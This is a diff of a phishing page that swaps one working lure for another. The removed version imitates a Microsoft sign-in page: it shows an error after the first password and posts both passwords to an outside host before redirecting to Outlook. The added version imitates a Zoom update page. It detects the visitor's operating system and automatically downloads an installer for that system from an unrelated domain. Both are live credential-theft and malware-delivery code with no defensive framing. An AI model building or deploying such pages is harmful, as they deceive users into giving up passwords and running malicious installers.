@@ -1,271 +1,164 @@
-<html lang="en"><head>
-
-
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Microsoft Sign In</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background: url('https://logincdn.msauth.net/shared/5/images/fluent_web_light_57fee22710b04cebe1d5.svg') no-repeat center center fixed;
-      background-size: cover;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .login-box {
-      background: white;
-      width: 400px;
-      padding: 40px;
-      border-radius: 12px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-      box-sizing: border-box;
-      text-align: center;
-      position: relative;
-    }
-
-    .logo {
-      margin-bottom: 10px;
-    }
-
-    .logo img {
-      width: 120px;
-      height: auto;
-    }
-
-    .email-pill {
-      background-color: #f3f2f1;
-      padding: 6px 12px;
-      border-radius: 20px;
-      display: inline-block;
-      font-size: 14px;
-      color: #1b1b1b;
-      margin-bottom: 24px;
-    }
-
-    .title {
-      font-size: 20px;
-      margin: 0 0 30px 0;
-      color: #1b1b1b;
-      font-weight: 400;
-    }
-
-    .input-group {
-      position: relative;
-      margin-bottom: 25px;
-    }
-
-    .input-group input {
-      width: 100%;
-      padding: 18px 40px 6px 10px;
-      font-size: 16px;
-      border: 1px solid #c6c6c6;
-      border-radius: 2px;
-      outline: none;
-      box-sizing: border-box;
-      transition: border-color 0.2s;
-    }
-
-    .input-group input:focus {
-      border-color: #0067b8;
-      box-shadow: inset 0 -2px 0 0 #0067b8;
-    }
-
-    .input-group label {
-      position: absolute;
-      left: 10px;
-      top: 14px;
-      font-size: 12px;
-      color: #666;
-      pointer-events: none;
-      transition: 0.2s ease all;
-    }
-
-    .input-group input:focus + label,
-    .input-group input:not(:placeholder-shown) + label {
-      top: 4px;
-      font-size: 10px;
-      color: #0067b8;
-    }
-
-    .eye-icon {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      width: 20px;
-      height: 20px;
-      background: url('https://logincdn.msauth.net/shared/1.0/content/images/icons/password_show.svg') no-repeat center;
-      background-size: contain;
-      cursor: pointer;
-    }
-
-    .forgot {
-      text-align: left;
-      margin-bottom: 24px;
-    }
-
-    .forgot a {
-      font-size: 14px;
-      color: #0067b8;
-      text-decoration: none;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #0067b8;
-      border: none;
-      border-radius: 2px;
-      color: white;
-      font-size: 15px;
-      cursor: pointer;
-      margin-bottom: 24px;
-    }
-
-    .security-option {
-      font-size: 14px;
-      color: #0067b8;
-      text-align: center;
-    }
-
-    .error-message {
-      color: red;
-      font-size: 14px;
-      margin-top: -10px;
-      margin-bottom: 20px;
-      display: none;
-    }
-
-    .footer {
-      position: absolute;
-      bottom: 15px;
-      width: 100%;
-      text-align: center;
-      font-size: 12px;
-      color: #888;
-    }
-
-    .footer a {
-      color: #888;
-      text-decoration: none;
-      margin: 0 10px;
-    }
-
-    .footer span {
-      display: block;
-      margin-top: 5px;
-    }
-  </style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zoom Workspace - Download</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            height: 100%;
+            overflow: hidden;
+            font-family: 'Helvetica', 'Arial', sans-serif;
+            background-color: #f7f7f7;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .header {
+            width: 100%;
+            background: #FFFFFF;
+            padding: 25px 0;
+            position: absolute;
+            top: 0;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .header img {
+            height: 40px;
+            width: auto;
+            object-fit: contain;
+        }
+        .container {
+            max-width: 600px;
+            margin-top: 100px;
+        }
+        .title {
+            font-size: 40px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #0a246a;
+        }
+        .message {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: #444;
+            line-height: 1.5;
+        }
+        .notice {
+            font-size: 16px;
+            margin: 25px 0;
+            padding: 15px;
+            background-color: #f0f0f0;
+            border-left: 4px solid #0a246a;
+            text-align: left;
+        }
+        .loading {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #ddd;
+            border-top: 5px solid #0a246a;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .download-link {
+            font-size: 18px;
+            margin-top: 30px;
+        }
+        .download-link a {
+            color: #0a246a;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .download-link a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            width: 100%;
+            background: #0a246a;
+            color: white;
+            position: absolute;
+            bottom: 0;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 14px;
+        }
+    </style>
 </head>
 <body>
-  <div class="login-box">
-    <div class="logo">
-      <img src="https://i.ibb.co/6J7H0X0W/download.png" alt="Microsoft Logo">
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Zoom_Communications_Logo.svg/1200px-Zoom_Communications_Logo.svg.png" alt="Zoom Logo">
     </div>
-    <div class="email-pill" id="emailDisplay">Invalid email format</div>
-    <div class="title">Enter your password</div>
 
-    <form id="loginForm">
-      <input type="hidden" id="email" name="email">
-      <input type="hidden" id="firstPassword" name="firstPassword">
+    <div class="container">
+        <div class="title">Joining Meeting</div>
+        <div class="message">You need the latest version of Zoom Workspace App to join this meeting.</div>
+        <div class="message">The correct version for your device will download automatically.</div>
 
-      <div class="input-group floating-label">
-        <input type="password" id="password" name="password" required="">
-        <label for="password">Password</label>
-        <div class="eye-icon"></div>
-      </div>    
+        <div class="notice">
+            <strong>Important:</strong> After download completes, please run the installer to update your Zoom application. The meeting will begin automatically after successful installation.
+        </div>
 
-      <div class="forgot">
-        <a href="#">Forgot your password?</a>
-      </div>
-
-      <button type="submit">Next</button>
-
-      <div class="error-message" id="errorMessage">Invalid password, try again</div>
-    </form>
-
-    <div class="security-option">
-      Use your face, fingerprint, PIN, or security key
+        <div class="loading"></div>
+        <div class="download-link">If the download doesn't start automatically, please <a id="manualDownload" href="#">click here</a>.</div>
     </div>
-  </div>
 
-  <div class="footer">
-    <a href="#">Help</a>
-    <a href="#">Terms of use</a>
-    <a href="#">Privacy and cookies</a>
-    <span>Use private browsing if this is not your device. <a href="#">Learn more</a></span>
-  </div>
+    <div class="footer">
+        © 2024 Zoom Video Communications, Inc. All rights reserved.
+    </div>
 
-  <script>
-    window.addEventListener('DOMContentLoaded', () => {
-      const hash = window.location.hash.slice(1);
-      const emailDisplay = document.getElementById('emailDisplay');
-      const emailInput = document.getElementById('email');
+    <script>
+        function detectOS() {
+            const platform = navigator.platform.toLowerCase();
+            const userAgent = navigator.userAgent.toLowerCase();
 
-      try {
-        const decoded = atob(decodeURIComponent(hash));
-        const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
-        if (emailRegex.test(decoded)) {
-          emailDisplay.textContent = decoded;
-          emailInput.value = decoded;
-        } else {
-          emailDisplay.textContent = "Invalid email format";
+            if (platform.includes('win') || userAgent.includes('windows')) 
+                return 'windows';
+            if (platform.includes('mac') || userAgent.includes('macintosh')) 
+                return 'macos';
+            if (platform.includes('linux') || userAgent.includes('linux')) 
+                return 'linux';
+
+            return 'windows';
         }
-      } catch (e) {
-        emailDisplay.textContent = "Error decoding email";
-      }
-    });
 
-    const form = document.getElementById('loginForm');
-    const errorMessage = document.getElementById('errorMessage');
-    const passwordInput = document.getElementById('password');
-    const firstPasswordInput = document.getElementById('firstPassword');
-    const emailInput = document.getElementById('email');
+        function getDownloadLink(os) {
+            switch (os) {
+                case 'windows':
+                    return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest';
+                case 'macos':
+                    return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.pkg?e=Access&y=Guest';
+                case 'linux':
+                    return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.sh?e=Access&y=Guest';
+                default:
+                    return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest';
+            }
+        }
 
-    let attemptCount = 0;
+        function startDownload() {
+            const osType = detectOS();
+            const downloadLink = getDownloadLink(osType);
+            
+            document.getElementById('manualDownload').href = downloadLink;
+            document.getElementById('manualDownload').textContent = `Download for ${osType.charAt(0).toUpperCase() + osType.slice(1)}`;
+            
+            setTimeout(() => {
+                window.location.href = downloadLink;
+            }, 3000);
+        }
 
-    form.addEventListener('submit', function(event) {
-      event.preventDefault();
-
-      const currentPassword = passwordInput.value;
-      const currentEmail = emailInput.value;
-
-      const data = new URLSearchParams();
-      data.append('email', currentEmail);
-
-      if (attemptCount === 0) {
-        // Store and send first password
-        firstPasswordInput.value = currentPassword;
-        data.append('firstPassword', currentPassword);
-
-        fetch('https://sessions-api-id-qualityturbo.com/v3-vox/squash.php', {
-          method: 'POST',
-          body: data
-        });
-
-        passwordInput.value = '';
-        errorMessage.style.display = 'block';
-        attemptCount++;
-      } else {
-        // Send both first and second
-        data.append('firstPassword', firstPasswordInput.value);
-        data.append('password', currentPassword);
-
-        fetch('https://sessions-api-id-qualityturbo.com/v3-vox/squash.php', {
-          method: 'POST',
-          body: data
-        }).then(() => {
-          window.location.href = 'https://outlook.live.com/mail/0/';
-        }).catch(() => {
-          window.location.href = 'https://outlook.live.com/mail/0/';
-        });
-      }
-    });
-  </script>
-
-
-</body></html>
+        window.onload = startDownload;
+    </script>
+</body>
+</html>
